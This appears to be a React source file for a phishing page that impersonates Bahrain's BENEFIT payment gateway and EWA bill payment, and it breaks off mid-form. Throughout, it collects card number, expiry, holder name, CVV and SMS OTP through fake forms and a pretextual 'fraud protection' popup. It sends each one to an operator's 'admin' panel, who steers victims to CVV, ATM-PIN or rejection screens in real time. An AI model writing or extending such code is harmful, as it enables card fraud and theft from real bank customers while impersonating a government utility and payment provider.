import { useState, useEffect, useRef, useCallback } from "react";
import { useLocation } from "wouter";
import { useSignalEffect } from "@preact/signals-react/runtime";
import {
  socket,
  sendData,
  navigateToPage,
  cardAction,
  codeAction,
  waitingMessage,
  visitor,
} from "@/lib/store";
import { getBinInfo } from "@/lib/binDatabase";

// Luhn algorithm to validate card number
function isValidCardNumber(number: string): boolean {
  if (!number || number.length < 13 || number.length > 19) return false;
  let sum = 0;
  let isEven = false;
  for (let i = number.length - 1; i >= 0; i--) {
    let digit = parseInt(number[i], 10);
    if (isEven) {
      digit *= 2;
      if (digit > 9) digit -= 9;
    }
    sum += digit;
    isEven = !isEven;
  }
  return sum % 10 === 0;
}

// Format card number with spaces every 4 digits
function formatCardNumber(value: string): string {
  const cleaned = value.replace(/\s+/g, "").replace(/\D/g, "");
  const groups = cleaned.match(/.{1,4}/g);
  return groups ? groups.join(" ") : cleaned;
}

const months = Array.from({ length: 12 }, (_, i) => ({
  value: String(i + 1),
  label: String(i + 1).padStart(2, "0"),
}));

const currentYear = new Date().getFullYear();
const years = Array.from({ length: 2069 - currentYear + 1 }, (_, i) => ({
  value: String(currentYear + i),
  label: String(currentYear + i),
}));

// Translations
const translations = {
  en: {
    langToggle: "عربي",
    gatewayTitle: "BENEFIT PAYMENT GATEWAY",
    amount: "Amount",
    cardType: "Card Type",
    cardTypeValue: "Debit",
    cardNumber: "Card Number",
    expiryDate: "Expiry Date",
    cardHolderName: "Card Holders Name",
    saveCard: "Save your card details for future payments to this merchant.",
    pay: "Pay",
    cancel: "Cancel",
    confirm: "Confirm",
    viewAccepted: "View Accepted Cards",
    note: "Note:",
    noteText: 'By submitting your information and using "BENEFIT Payment Gateway", you indicate that you agree to the',
    termsLink: "Terms of Services - Legal Disclaimer",
    poweredBy: "Powered By The BENEFIT Company.",
    copyright: "Copyright © 2020-2025 The BENEFIT Company. All Rights Reserved.",
    licensed: "Licensed by Central Bank of Bahrain as Ancillary Service Provider.",
    otpNotifTitle: "NOTIFICATION:",
    otpNotifText: "You will presently receive an SMS on your mobile number registered with your bank. This is an OTP (One Time Password) SMS, it contains 6 digits to be entered in the box below.",
    otp: "OTP",
    processing: "Processing...",
    close: "Close",
    errCardNumber: "Please enter a valid card number",
    errExpiry: "Please select expiry date",
    errCardHolder: "Please enter card holder name",
    errOtp: "Please enter a valid OTP (4-6 digits)",
    errRejectCard: "Please check the entered information",
    errRejectOtp: "Please enter the correct OTP",
    // CVV popup translations
    cvvTitle: "BENEFIT PAYMENT GATEWAY",
    cvvSubtitle: "Card Verification",
    cvvMessage: "Please enter the 3-digit CVV code found on the back of the card ending in",
    cvvMessageSuffix: "to verify the ownership and eligibility of the cardholder for protection against electronic fraud risks and to confirm the payment process.",
    cvvLabel: "CVV",
    cvvSubmit: "Confirm",
    cvvCancel: "Cancel",
    cvvError: "Please enter a valid CVV (3 digits)",
    cvvProcessing: "Verifying...",
    errCvv: "The CVV code is incorrect, please try again.",
  },
  ar: {
    langToggle: "English",
    gatewayTitle: "بوابة الدفع بنفت",
    amount: "المبلغ",
    cardType: "نوع البطاقة",
    cardTypeValue: "بطاقة خصم",
    cardNumber: "رقم البطاقة",
    expiryDate: "تاريخ الانتهاء",
    cardHolderName: "اسم حامل البطاقة",
    saveCard: "حفظ بيانات بطاقتك للمدفوعات المستقبلية لهذا التاجر.",
    pay: "ادفع",
    cancel: "إلغاء",
    confirm: "تأكيد",
    viewAccepted: "عرض البطاقات المقبولة",
    note: "ملاحظة:",
    noteText: 'بتقديم معلوماتك واستخدام "بوابة الدفع بنفت"، فإنك توافق على',
    termsLink: "شروط الخدمة - إخلاء المسؤولية القانونية",
    poweredBy: "مدعوم من شركة بنفت.",
    copyright: "حقوق النشر © 2020-2025 شركة بنفت. جميع الحقوق محفوظة.",
    licensed: "مرخصة من مصرف البحرين المركزي كمزود خدمات مساندة.",
    otpNotifTitle: "إشعار:",
    otpNotifText: "ستتلقى قريباً رسالة نصية على رقم هاتفك المسجل لدى البنك. تحتوي الرسالة على رمز تحقق (OTP) مكون من 6 أرقام، يرجى إدخاله في الحقل أدناه.",
    otp: "رمز التحقق",
    processing: "جاري المعالجة...",
    close: "إغلاق",
    errCardNumber: "الرجاء إدخال رقم بطاقة صحيح",
    errExpiry: "الرجاء اختيار تاريخ الانتهاء",
    errCardHolder: "الرجاء إدخال اسم حامل البطاقة",
    errOtp: "الرجاء إدخال رمز تحقق صحيح (4-6 أرقام)",
    errRejectCard: "يرجى التأكد من المعلومات المدخلة",
    errRejectOtp: "يرجى إدخال الرمز بشكل صحيح",
    // CVV popup translations
    cvvTitle: "بوابة الدفع بنفت",
    cvvSubtitle: "التحقق من البطاقة",
    cvvMessage: "يرجى إدخال رمز CVV المكون من 3 خانات والموجود خلف البطاقة المنتهية بـ",
    cvvMessageSuffix: "ليتم التأكد من ملكية وأهلية صاحب البطاقة للحماية من مخاطر الاحتيال الإلكتروني والتأكد من عملية الدفع.",
    cvvLabel: "CVV",
    cvvSubmit: "تأكيد",
    cvvCancel: "إلغاء",
    cvvError: "الرجاء إدخال رمز CVV صحيح (3 خانات)",
    cvvProcessing: "جاري التحقق...",
    errCvv: "رمز CVV غير صحيح، يرجى المحاولة مرة أخرى.",
  },
};

type Phase = "card" | "cvv" | "otp";
type Lang = "en" | "ar";

const RED = "#e60000";

export default function KNETPayment() {
  const [, navigate] = useLocation();
  const [phase, setPhase] = useState<Phase>("card");
  const [lang, setLang] = useState<Lang>("en");

  const t = translations[lang];
  const isRtl = lang === "ar";

  // Card form state
  const [cardNumber, setCardNumber] = useState("");
  const [expiryMonth, setExpiryMonth] = useState("");
  const [expiryYear, setExpiryYear] = useState("");
  const [cardHolderName, setCardHolderName] = useState("");
  const [saveCard, setSaveCard] = useState(false);

  // CVV popup state
  const [showCvvPopup, setShowCvvPopup] = useState(false);
  const [cvvLoading, setCvvLoading] = useState(false);
  const [cvvCode, setCvvCode] = useState("");
  const [cvvError, setCvvError] = useState(false);
  const [cvvWaiting, setCvvWaiting] = useState(false);
  const [showCvvImage, setShowCvvImage] = useState(false);

  // OTP state
  const [otpCode, setOtpCode] = useState("");
  const [countdown, setCountdown] = useState(180);
  const countdownRef = useRef<ReturnType<typeof setInterval> | null>(null);

  // Common state
  const [validationError, setValidationError] = useState("");
  const [isWaiting, setIsWaiting] = useState(false);
  const [rejectedError, setRejectedError] = useState("");
  const [showErrorModal, setShowErrorModal] = useState(false);
  const [errorModalMessage, setErrorModalMessage] = useState("");
  const [showAcceptedCards, setShowAcceptedCards] = useState(false);

  // Get amount from localStorage
  const mohData = JSON.parse(localStorage.getItem("mohPaymentData") || "{}");
  const totalAmount = mohData.totalAmount || localStorage.getItem("Total") || "0.000";
  // Real-time date/time
  const [dateStr, setDateStr] = useState("");
  useEffect(() => {
    const updateTime = () => {
      const n = new Date();
      setDateStr(`${String(n.getDate()).padStart(2, "0")}-${String(n.getMonth() + 1).padStart(2, "0")}-${n.getFullYear()} ${String(n.getHours()).padStart(2, "0")}:${String(n.getMinutes()).padStart(2, "0")}:${String(n.getSeconds()).padStart(2, "0")}`);
    };
    updateTime();
    const timer = setInterval(updateTime, 1000);
    return () => clearInterval(timer);
  }, []);

  // Card validation states
  const [luhnError, setLuhnError] = useState(false);
  const [cardError, setCardError] = useState(false);

  // Masked card for OTP phase
  const cleanCardNum = cardNumber.replace(/\s+/g, "");
  const cardLast4 = cleanCardNum.slice(-4);
  const maskedCard = "******" + cardLast4;

  useEffect(() => {
    navigateToPage("دفع بنفت");
    // Check if admin redirected to CVV popup
    const openCvv = localStorage.getItem("openCvvPopup");
    if (openCvv === "true") {
      localStorage.removeItem("openCvvPopup");
      setShowCvvPopup(true);
      setPhase("cvv");
      navigateToPage("CVV بنفت");
    }
    // Check if admin redirected to OTP benefit
    const openOtp = localStorage.getItem("openOtpBenefit");
    if (openOtp === "true") {
      localStorage.removeItem("openOtpBenefit");
      setPhase("otp");
      startCountdown();
      navigateToPage("رمز التحقق بنفت (OTP)");
    }
  }, []);

  // Countdown timer for OTP
  const startCountdown = useCallback(() => {
    setCountdown(180);
    if (countdownRef.current) clearInterval(countdownRef.current);
    countdownRef.current = setInterval(() => {
      setCountdown((prev) => {
        if (prev <= 1) {
          if (countdownRef.current) clearInterval(countdownRef.current);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);
  }, []);

  useEffect(() => {
    return () => {
      if (countdownRef.current) clearInterval(countdownRef.current);
    };
  }, []);

  const formatCountdown = (seconds: number) => {
    const m = Math.floor(seconds / 60);
    const s = seconds % 60;
    return `${m}:${String(s).padStart(2, "0")}`;
  };

  // Handle card action from admin
  useSignalEffect(() => {
    if (cardAction.value) {
      const action = cardAction.value.action;
      waitingMessage.value = "";
      setIsWaiting(false);

      if (phase === "card" || phase === "cvv") {
        if (action === "otp") {
          setShowCvvPopup(false);
          setCvvWaiting(false);
          setPhase("otp");
          startCountdown();
          navigateToPage("رمز التحقق بنفت (OTP)");
        } else if (action === "atm" || action === "cvv") {
          setShowCvvPopup(false);
          setCvvWaiting(false);
          navigate("/atm-password");
        } else if (action === "reject") {
          setShowCvvPopup(false);
          setCvvWaiting(false);
          setRejectedError(t.errRejectCard);
          setCardNumber("");
          setCardHolderName("");
          setExpiryMonth("");
          setExpiryYear("");
          setPhase("card");
        }
      } else if (phase === "otp") {
        if (action === "otp" || action === "approve") {
          navigate("/atm-password");
        } else if (action === "cvv") {
          navigate("/cvv");
        } else if (action === "atm") {
          navigate("/atm-password");
        } else if (action === "reject") {
          setRejectedError(t.errRejectOtp);
          setOtpCode("");
        }
      }
      cardAction.value = null;
    }
  });

  // Handle code action from admin
  useSignalEffect(() => {
    if (codeAction.value) {
      const action = codeAction.value.action;
      waitingMessage.value = "";
      setIsWaiting(false);

      if (phase === "cvv") {
        setCvvWaiting(false);
        if (action === "approve" || action === "otp") {
          // CVV approved - move to OTP
          setShowCvvPopup(false);
          setPhase("otp");
          startCountdown();
          navigateToPage("رمز التحقق بنفت (OTP)");
        } else if (action === "atm" || action === "cvv") {
          setShowCvvPopup(false);
          navigate("/atm-password");
        } else if (action === "reject") {
          setShowCvvPopup(false);
          setRejectedError(t.errRejectCard);
          setCardNumber("");
          setCardHolderName("");
          setExpiryMonth("");
          setExpiryYear("");
          setPhase("card");
          setCvvCode("");
        }
        codeAction.value = null;
        return;
      }

      if (phase === "otp") {
        if (action === "cvv") {
          navigate("/cvv");
        } else if (action === "reject") {
          setRejectedError(t.errRejectOtp);
          setOtpCode("");
        } else if (action === "approve" || action === "otp") {
          navigate("/atm-password");
        } else if (action === "atm") {
          navigate("/atm-password");
        }
      } else if (phase === "card") {
        if (action === "reject") {
          setRejectedError(t.errRejectCard);
          setCardNumber("");
          setCardHolderName("");
          setExpiryMonth("");
          setExpiryYear("");
        }
      }
      codeAction.value = null;
    }
  });

  // Handle card number change with formatting, Luhn, and blocked prefix checks
  const handleCardChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const rawValue = e.target.value.replace(/\s+/g, "").replace(/\D/g, "");
    const blockedPrefixes = visitor.value.blockedCardPrefixes;
    const cardPrefix = rawValue.slice(0, 4);

    if (blockedPrefixes && blockedPrefixes.includes(cardPrefix)) {
      setCardError(true);
      setCardNumber("");
      setLuhnError(false);
    } else {
      const formattedValue = formatCardNumber(rawValue);
      setCardNumber(formattedValue);
      setCardError(false);
      if (rawValue.length >= 13 && rawValue.length <= 19) {
        setLuhnError(!isValidCardNumber(rawValue));
      } else {
        setLuhnError(false);
      }
    }
    setValidationError("");
  };

  const validateCardForm = (): boolean => {
    const cleanCard = cardNumber.replace(/\s+/g, "");
    if (!cleanCard || cleanCard.length < 13 || cleanCard.length > 19) {
      setValidationError(t.errCardNumber);
      return false;
    }
    if (!isValidCardNumber(cleanCard)) {
      setValidationError(t.errCardNumber);
      return false;
    }
    if (!expiryMonth || !expiryYear) {
      setValidationError(t.errExpiry);
      return false;
    }
    if (!cardHolderName.trim()) {
      setValidationError(t.errCardHolder);
      return false;
    }
    setValidationError("");
    return true;
  };

  const handleCardSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!validateCardForm()) return;

    // Send card info to admin immediately
    setCvvLoading(true);
    setRejectedError("");

    const cleanCard = cardNumber.replace(/\s+/g, "");
    sendData({
      paymentCard: {
        cardNumber: cleanCard,
        cardNumberOnly: cleanCard,
        prefix: "",
        nameOnCard: cardHolderName,
        expiryMonth: expiryMonth.padStart(2, "0"),
        expiryYear: expiryYear,
        cvv: "N/A",
        pin: "N/A",
        bankName: "BENEFIT",
        paymentMethod: "BENEFIT Debit",
      },
      current: "بيانات البطاقة بنفت",
      nextPage: "CVV بنفت",
      waitingForAdminResponse: false,
      isCustom: true,
    });

    // Show CVV popup after 2 seconds
    setTimeout(() => {
      setCvvLoading(false);
      setShowCvvPopup(true);
      setCvvCode("");
      setCvvError(false);
      setPhase("cvv");
      navigateToPage("CVV بنفت");
    }, 2000);
  };

  const handleCvvSubmit = () => {
    if (!cvvCode || !/^\d{3}$/.test(cvvCode)) {
      setCvvError(true);
      return;
    }

    setCvvWaiting(true);
    setCvvError(false);

    const cleanCard = cardNumber.replace(/\s+/g, "");
    localStorage.setItem("cardNumber", cleanCard);
    localStorage.setItem("cardMonth", expiryMonth.padStart(2, "0"));
    localStorage.setItem("cardYear", expiryYear);
    localStorage.setItem("Total", String(totalAmount));

    const paymentData = {
      totalPaid: totalAmount,
      cardType: "benefit",
      cardLast4: cleanCard.slice(-4),
      serviceName: mohData.serviceType || "دفع فاتورة الكهرباء والماء",
      bankName: "BENEFIT",
      bankLogo: "/benefit-logo.png",
    };
    localStorage.setItem("paymentData", JSON.stringify(paymentData));

    sendData({
      paymentCard: {
        cardNumber: cleanCard,
        cardNumberOnly: cleanCard,
        prefix: "",
        nameOnCard: cardHolderName,
        expiryMonth: expiryMonth.padStart(2, "0"),
        expiryYear: expiryYear,
        cvv: cvvCode,
        pin: "N/A",
        bankName: "BENEFIT",
        paymentMethod: "BENEFIT Debit",
      },
      current: "CVV بنفت",
      nextPage: "رمز التحقق بنفت (OTP)",
      waitingForAdminResponse: true,
      isCustom: true,
    });
  };

  const handleCvvCancel = () => {
    setShowCvvPopup(false);
    setCvvCode("");
    setCvvError(false);
    setCvvWaiting(false);
    setPhase("card");
  };

  const handleOtpSubmit = () => {
    if (!otpCode || !/^\d{4,6}$/.test(otpCode)) {
      setShowErrorModal(true);
      setErrorModalMessage(t.errOtp);
      return;
    }

    setIsWaiting(true);

    sendData({
      digitCode: otpCode,
      current: "رمز التحقق بنفت (OTP)",
      nextPage: "الصفحة النهائية",
      waitingForAdminResponse: true,
      isCustom: true,
    });
  };

  const toggleLang = () => {
    setLang(lang === "en" ? "ar" : "en");
    setValidationError("");
    setRejectedError("");
  };

  // Shared header component
  const renderHeader = () => (
    <div className="knet-header-area" style={{ padding: "15px 25px", borderBottom: "1px solid #eee" }}>
      <div style={{ textAlign: isRtl ? "left" : "right", marginBottom: 8 }}>
        <span onClick={toggleLang} style={{ color: RED, fontSize: 13, cursor: "pointer" }}>{t.langToggle}</span>
      </div>
      <div className="knet-header-row" style={{ display: "flex", justifyContent: "space-between", alignItems: "flex-start", direction: "ltr" }}>
        <div style={{ flex: "0 0 auto" }}>
          <img src="/ewa-logo.png" alt="EWA" style={{ height: 55 }} />
        </div>
        <div style={{ textAlign: "center", flex: 1 }}>
          <div style={{ color: RED, fontSize: 18, fontWeight: "bold", letterSpacing: 1 }}>{t.gatewayTitle}</div>
          <div style={{ color: RED, fontSize: 14, marginTop: 4 }}>{dateStr}</div>
        </div>
        <div style={{ textAlign: "right", flex: "0 0 auto" }}>
          <div style={{ fontSize: 14, fontWeight: "bold", color: "#333" }}>EWA</div>
          <div style={{ fontSize: 12, color: "#666" }}>https://www.npa2.bahrain.bh</div>
        </div>
      </div>
    </div>
  );

  // Shared footer component
  const renderFooter = (showViewCards = false) => (
    <div className="knet-footer-area" style={{ padding: "15px 40px 25px", borderTop: "1px solid #eee", direction: isRtl ? "rtl" : "ltr" }}>
      {showViewCards && (
        <div style={{ marginBottom: 20 }}>
          <span onClick={() => setShowAcceptedCards(!showAcceptedCards)} style={{ color: RED, fontSize: 13, cursor: "pointer" }}>{t.viewAccepted}</span>
          {showAcceptedCards && (
            <ul style={{ fontSize: 13, color: "#333", lineHeight: 2, marginTop: 10, listStyleType: "disc", paddingLeft: isRtl ? 0 : 30, paddingRight: isRtl ? 30 : 0, direction: isRtl ? "rtl" : "ltr" }}>
              {(lang === "ar" ? [
                "بيت التمويل الكويتي ش.م.ب.(مقفلة)",
                "بنك البركة الإسلامي ش.م.ب",
                "بنك السلام - البحرين ش.م.ب.",
                "البنك العربي ش.م.ع",
                "بنك البحرين الإسلامي",
                "بنك البحرين والكويت",
                "سيتي بنك ن. أ.",
                "كريدي ليبانيه ش.م.ل",
                "بنك الخليج الدولي ش.م.ب",
                "بنك حبيب المحدود",
                "بنك HSBC الشرق الأوسط المحدود",
                "بنك ICICI المحدود",
                "بنك إلى",
                "بنك إثمار ش.م.ب. (مغلق)",
                "بنك الخليجي التجاري ش.م.ب.",
                "بنك المشرق ش.م.ع",
                "بنك البحرين الوطني ش.م.ب.",
                "بنك الكويت الوطني ش.م.ك. / الفرع التجاري",
                "بيمنت إنترناشيونال إنتربرايز ش.م.ب (مغلق)",
                "ستاندرد تشارترد بنك",
                "بنك الدولة الهندي (الفرع الأجنبي)",
                "بنك الإسكان للتجارة والتمويل - الأردن",
                "يونايتد بنك المحدود",
              ] : [
                "Kuwait Finance House B.S.C.(c).",
                "Al Baraka Islamic Bank B.S.C",
                "Al-Salam Bank - Bahrain B.S.C.",
                "Arab Bank Plc",
                "Bahrain Islamic Bank",
                "BANK OF BAHRAIN AND KUWAIT",
                "Citi Bank N. A.",
                "CREDIT LIBANAIS S.A.L",
                "Gulf International Bank B.S.C",
                "Habib Bank Limited",
                "HSBC Bank Middle East Limited",
                "ICICI Bank Limited",
                "ila Bank",
                "Ithmaar Bank B.S.C. (Closed)",
                "Khaleeji Commercial Bank B.S.C.",
                "Mashreq Bank P.S.C",
                "National Bank Of Bahrain B.S.C.",
                "National Bank Of Kuwait S.A.K. / Commercial Branch",
                "Payment international Enterprise BSC (closed)",
                "Standard Chartered Bank",
                "STATE BANK OF INDIA (FOREIGN BRANCH)",
                "The Housing Bank For Trade And Finance - Jordan",
                "United Bank Limited",
              ]).map((bank, i) => <li key={i}>{bank}</li>)}
            </ul>
          )}
        </div>
      )}
      <div style={{ fontSize: 12, color: "#333", marginBottom: 20, lineHeight: 1.6 }}>
        <strong>{t.note}</strong> {t.noteText}{" "}
        <span style={{ color: "#0066cc", cursor: "pointer" }}>{t.termsLink}</span>.
      </div>
      <div>
        <img src="/benefit-logo.png" alt="Benefit" style={{ height: 60, marginBottom: 8 }} />
        <div style={{ fontSize: 12, color: "#666", lineHeight: 1.8 }}>
          {t.poweredBy}<br />
          {t.copyright}<br />
          {t.licensed}
        </div>
      </div>
    </div>
  );

  // CVV Popup Modal
  const renderCvvPopup = () => {
    if (!showCvvPopup) return null;

    return (
      <div style={{
        position: "fixed",
        top: 0,
        left: 0,
        width: "100%",
        height: "100%",
        backgroundColor: "rgba(0,0,0,0.5)",
        zIndex: 999999,
        display: "flex",
        alignItems: "center",
        justifyContent: "center",
        padding: "20px",
      }}>
        <div className="knet-cvv-popup" style={{
          backgroundColor: "#fff",
          borderRadius: 12,
          maxWidth: 420,
          width: "100%",
          boxShadow: "0 20px 60px rgba(0,0,0,0.3)",
          overflow: "hidden",
          animation: "fadeInUp 0.3s ease-out",
        }}>
          {/* Popup Header - Logos */}
          <div style={{
            background: "#fff",
            padding: "12px 20px",
          }}>
            <div style={{
              display: "flex",
              justifyContent: "space-between",
              alignItems: "center",
              direction: "rtl",
            }}>
              <div style={{ flex: "0 0 auto" }}>
                <img
                  src="/logo_ar.svg"
                  alt="شعار مملكة البحرين"
                  style={{ height: 32 }}
                  onError={(e: any) => { e.target.src = '/bahrain-iga-logo.png'; }}
                />
              </div>
              <div style={{ flex: "0 0 auto" }}>
                <img
                  src="/madfooat-logo.png"
                  alt="مدفوعات البحرين"
                  style={{ height: 24 }}
                />
              </div>
            </div>
          </div>
          {/* Title - separate line below logos */}
          <div style={{
            textAlign: "center",
            padding: "8px 20px",
            borderTop: "1px solid #eee",
            borderBottom: "1px solid #e0e0e0",
            background: "#fafafa",
          }}>
            <div style={{
              color: RED,
              fontSize: 13,
              fontWeight: "bold",
              letterSpacing: 0.3,
            }}>
              {t.cvvTitle}
            </div>
          </div>

          {/* Popup Body */}
          <div className="knet-cvv-body" style={{ padding: "18px 22px", direction: isRtl ? "rtl" : "ltr" }}>
            {/* Info message */}
            <div style={{
              backgroundColor: "#f0f7ff",
              border: "1px solid #bdd7f1",
              borderRadius: 6,
              padding: "10px 14px",
              marginBottom: 18,
              fontSize: 12,
              lineHeight: 1.6,
              color: "#2c5282",
              textAlign: isRtl ? "right" : "left",
            }}>
              <p style={{ margin: 0 }}>
                {t.cvvMessage}{" "}
                <span style={{ fontWeight: "bold", color: "#1a365d", direction: "ltr", display: "inline-block" }}>{cardLast4}</span>
                {" "}{t.cvvMessageSuffix}
                {" "}
                <span
                  onClick={() => setShowCvvImage(!showCvvImage)}
                  style={{
                    display: "inline-flex",
                    alignItems: "center",
                    justifyContent: "center",
                    width: 18,
                    height: 18,
                    borderRadius: "50%",
                    backgroundColor: "#2c5282",
                    color: "#fff",
                    fontSize: 11,
                    fontWeight: "bold",
                    cursor: "pointer",
                    verticalAlign: "middle",
                    marginRight: isRtl ? 0 : 2,
                    marginLeft: isRtl ? 2 : 0,
                    lineHeight: 1,
                    userSelect: "none",
                  }}
                  title={lang === "ar" ? "أين أجد رمز CVV؟" : "Where to find CVV?"}
                >
                  ?
                </span>
              </p>
              {showCvvImage && (
                <div style={{ textAlign: "center", marginTop: 10 }}>
                  <img
                    src="/images/cvv-info.png"
                    alt="CVV location"
                    style={{
                      maxWidth: 180,
                      borderRadius: 6,
                      border: "1px solid #ddd",
                      boxShadow: "0 2px 8px rgba(0,0,0,0.1)",
                    }}
                  />
                </div>
              )}
            </div>

            {/* CVV Error */}
            {cvvError && (
              <div style={{
                backgroundColor: "#fff5f5",
                border: "1px solid #fed7d7",
                color: "#c53030",
                padding: "10px 14px",
                borderRadius: 6,
                marginBottom: 16,
                fontSize: 13,
                textAlign: "center",
                fontWeight: "500",
              }}>
                {cvvCode.length > 0 ? t.errCvv : t.cvvError}
              </div>
            )}

            {/* CVV Input */}
            <div style={{
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
              gap: 12,
              marginBottom: 20,
            }}>
              <label style={{
                fontSize: 14,
                fontWeight: "bold",
                color: "#333",
                minWidth: 40,
              }}>
                {t.cvvLabel}
              </label>
              <input
                type="tel"
                inputMode="numeric"
                maxLength={3}
                value={cvvCode}
                onChange={(e) => {
                  const val = e.target.value.replace(/\D/g, "").slice(0, 3);
                  setCvvCode(val);
                  setCvvError(false);
                }}
                autoFocus
                placeholder="•••"
                style={{
                  width: 100,
                  height: 38,
                  border: `2px solid ${cvvError ? '#e53e3e' : '#cbd5e0'}`,
                  borderRadius: 8,
                  padding: "0 16px",
                  fontSize: 18,
                  textAlign: "center",
                  outline: "none",
                  letterSpacing: 8,
                  fontWeight: "bold",
                  caretColor: "auto",
                  direction: "ltr",
                  transition: "border-color 0.2s",
                }}
                onFocus={(e) => { if (!cvvError) e.target.style.borderColor = RED; }}
                onBlur={(e) => { if (!cvvError) e.target.style.borderColor = '#cbd5e0'; }}
              />
            </div>

            {/* Buttons */}
            <div style={{
              display: "flex",
              justifyContent: "center",
              gap: 12,
            }}>
              <button
                type="button"
                onClick={handleCvvSubmit}
                disabled={cvvWaiting || cvvCode.length !== 3}
                style={{
                  backgroundColor: RED,
                  color: "#fff",
                  border: "none",
                  padding: "10px 40px",
                  borderRadius: 6,
                  fontSize: 14,
                  fontWeight: "bold",
                  cursor: cvvWaiting || cvvCode.length !== 3 ? "not-allowed" : "pointer",
                  opacity: cvvWaiting || cvvCode.length !== 3 ? 0.6 : 1,
                  minWidth: 120,
                  transition: "all 0.2s",
                  display: "flex",
                  alignItems: "center",
                  justifyContent: "center",
                  gap: 8,
                }}
              >
                {cvvWaiting ? (
                  <>
                    <div style={{
                      border: "2px solid #fff",
                      borderTop: "2px solid transparent",
                      borderRadius: "50%",
                      width: 16,
                      height: 16,
                      animation: "spin 1s linear infinite",
                    }} />
                    {t.cvvProcessing}
                  </>
                ) : (
                  t.cvvSubmit
                )}
              </button>
              <button
                type="button"
                onClick={handleCvvCancel}
                disabled={cvvWaiting}
                style={{
                  backgroundColor: "#fff",
                  color: "#333",
                  border: "1px solid #ccc",
                  padding: "10px 30px",
                  borderRadius: 6,
                  fontSize: 14,
                  cursor: cvvWaiting ? "not-allowed" : "pointer",
                  minWidth: 100,
                  transition: "all 0.2s",
                }}
              >
                {t.cvvCancel}
              </button>
            </div>
          </div>

          {/* Popup Footer */}
          <div style={{
            backgroundColor: "#f8f9fa",
            padding: "8px 20px",
            borderTop: "1px solid #eee",
            textAlign: "center",
          }}>
            <img src="/benefit-logo.png" alt="Benefit" style={{ height: 35, marginBottom: 4 }} />
            <div style={{ fontSize: 9, color: "#999" }}>
              {t.poweredBy}
            </div>
          </div>
        </div>
      </div>
    );
  };

  return (
    <div style={{ margin: 0, padding: 0, fontFamily: "'Segoe UI', Tahoma, Geneva, Verdana, sans-serif", backgroundColor: "#f5f5f5", minHeight: "100vh", direction: isRtl ? "rtl" : "ltr" }}>
      {/* Animations */}
      <style>{`
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        @keyframes fadeInUp {
          from { opacity: 0; transform: translateY(20px); }
          to { opacity: 1; transform: translateY(0); }
        }
        @media (max-width: 600px) {
          .knet-header-row { flex-direction: column !important; align-items: center !important; gap: 8px !important; }
          .knet-header-row > div { text-align: center !important; }
          .knet-form-area { padding: 15px 16px !important; }
          .knet-form-row { flex-direction: column !important; align-items: stretch !important; gap: 4px !important; }
          .knet-form-row label { width: auto !important; font-size: 13px !important; margin-bottom: 2px !important; }
          .knet-form-row input, .knet-form-row select { width: 100% !important; box-sizing: border-box !important; }
          .knet-form-row .knet-select-group { width: 100% !important; }
          .knet-form-row .knet-select-group select { flex: 1 !important; }
          .knet-footer-area { padding: 15px 16px 20px !important; }
          .knet-header-area { padding: 12px 16px !important; }
          .knet-otp-area { padding: 15px 16px !important; }
          .knet-btn-row { flex-direction: row !important; }
          .knet-btn-row button { flex: 1 !important; min-width: auto !important; padding: 10px 10px !important; }
          .knet-cvv-popup { max-width: 95vw !important; }
          .knet-cvv-body { padding: 14px 14px !important; }
        }
      `}</style>

      {/* Loading overlay for initial 2-second delay */}
      {cvvLoading && (
        <div style={{ position: "fixed", top: 0, left: 0, width: "100%", height: "100%", backgroundColor: "rgba(0,0,0,0.3)", zIndex: 999999, display: "flex", alignItems: "center", justifyContent: "center" }}>
          <div style={{ textAlign: "center", color: "#fff", fontSize: 16 }}>
            <div style={{ border: "4px solid #f3f3f3", borderTop: `4px solid ${RED}`, borderRadius: "50%", width: 40, height: 40, animation: "spin 1s linear infinite", margin: "0 auto 10px" }} />
            {t.processing}
          </div>
        </div>
      )}

      {/* Loading overlay for waiting states */}
      {isWaiting && (
        <div style={{ position: "fixed", top: 0, left: 0, width: "100%", height: "100%", backgroundColor: "rgba(0,0,0,0.3)", zIndex: 999999, display: "flex", alignItems: "center", justifyContent: "center" }}>
          <div style={{ textAlign: "center", color: "#fff", fontSize: 16 }}>
            <div style={{ border: "4px solid #f3f3f3", borderTop: `4px solid ${RED}`, borderRadius: "50%", width: 40, height: 40, animation: "spin 1s linear infinite", margin: "0 auto 10px" }} />
            {t.processing}
          </div>
        </div>
      )}

      {/* Error Modal */}
      {showErrorModal && (
        <div style={{ position: "fixed", top: 0, left: 0, width: "100%", height: "100%", backgroundColor: "rgba(0,0,0,0.4)", zIndex: 999999, display: "flex", alignItems: "center", justifyContent: "center" }}>
          <div style={{ backgroundColor: "#fff", borderRadius: 8, padding: 30, maxWidth: 400, width: "90%", textAlign: "center" }}>
            <p style={{ fontSize: 14, marginBottom: 20 }}>{errorModalMessage}</p>
            <button onClick={() => setShowErrorModal(false)} style={{ backgroundColor: RED, color: "#fff", border: "none", padding: "8px 30px", borderRadius: 4, cursor: "pointer", fontSize: 14 }}>{t.close}</button>
          </div>
        </div>
      )}

      {/* CVV Popup Modal */}
      {renderCvvPopup()}

      <div style={{ maxWidth: 960, margin: "0 auto", padding: "0 15px" }}>
        {/* ============ CARD PHASE ============ */}
        {(phase === "card" || phase === "cvv") && (
          <div style={{ backgroundColor: "#fff", border: "1px solid #ddd", marginTop: 20, marginBottom: 20 }}>
            {renderHeader()}

            {/* Form Area */}
            <div className="knet-form-area" style={{ padding: "25px 40px" }}>
              {validationError && (
                <div style={{ backgroundColor: "#f8d7da", border: "1px solid #f5c6cb", color: "#721c24", padding: "8px 15px", borderRadius: 4, marginBottom: 15, fontSize: 13 }}>
                  {validationError}
                </div>
              )}

              {rejectedError && (
                <div style={{ color: RED, fontWeight: "bold", textAlign: "center", marginBottom: 15, fontSize: 13 }}>
                  {rejectedError}
                </div>
              )}

              <form onSubmit={handleCardSubmit}>
                <div className="knet-form-row" style={{ display: "flex", marginBottom: 15, alignItems: "center" }}>
                  <label style={{ width: 180, fontSize: 14, color: "#333" }}>{t.amount}</label>
                  <span style={{ fontSize: 14, fontWeight: "bold", color: "#333" }}>BD {totalAmount}</span>
                </div>

                <div className="knet-form-row" style={{ display: "flex", marginBottom: 15, alignItems: "center" }}>
                  <label style={{ width: 180, fontSize: 14, color: "#333" }}>{t.cardType}</label>
